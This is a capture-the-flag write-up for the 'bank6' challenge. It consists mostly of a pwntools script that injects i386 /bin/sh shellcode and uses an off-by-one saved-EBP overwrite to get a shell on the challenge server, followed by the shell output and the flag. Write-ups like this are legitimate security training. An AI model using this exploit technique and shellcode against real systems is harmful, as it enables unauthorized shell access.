## bank6 (200 points)

#### Solved by nhanlun

```
nc 61.28.237.24 30207

author: xikhud
```

```py
from pwn import *

conn = remote("61.28.237.24", 30207)

welcome = 0x08048581

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x08\x40\x40\x40\xcd\x80\x31\xc0\x40\xcd\x80'
# shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x08\x40\x40\x40\xcd\x80'
# shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x08\x40\x40\x40\xcd\x80'
# shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x08\x40\x40\x40\xcd\x80\x31\xc0\x40\xcd\x80'

conn.recvline()
buffer = int(conn.recvline().decode().strip().replace("[+] Here is a gift: ", ""), 16)
log.info("Buffer's address: " + hex(buffer))

ebp = buffer + 1036 + 0x10
log.info("ebp: " + hex(ebp))

ebp_off_by_one = ebp & int((~0xff))
log.info("ebp off by one: " + hex(ebp_off_by_one))

context.update(os="linux", arch='i386')
# somehow these 2 lines does not work, have to replace by hand
# shellcode = asm(shellcraft.sh())
# shellcode.replace(b'\x0b', b'\x08\x40\x40\x40')
print(len(shellcode))
print(shellcode)

PAYLOAD = b''
PAYLOAD += shellcode
PAYLOAD += ((ebp_off_by_one - len(PAYLOAD) - buffer) * 'A' + 'AAAA').encode()
PAYLOAD += p32(buffer) + ((1032 - len(PAYLOAD)) * 'A').encode()

print(len(PAYLOAD))
print(PAYLOAD)

conn.sendlineafter("name: ", PAYLOAD)
conn.interactive()
```

```
$ ls
bank6
bin
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
HCMUS-CTF{0ff_by_on3}
```

**Flag:** `HCMUS-CTF{0ff_by_on3}`
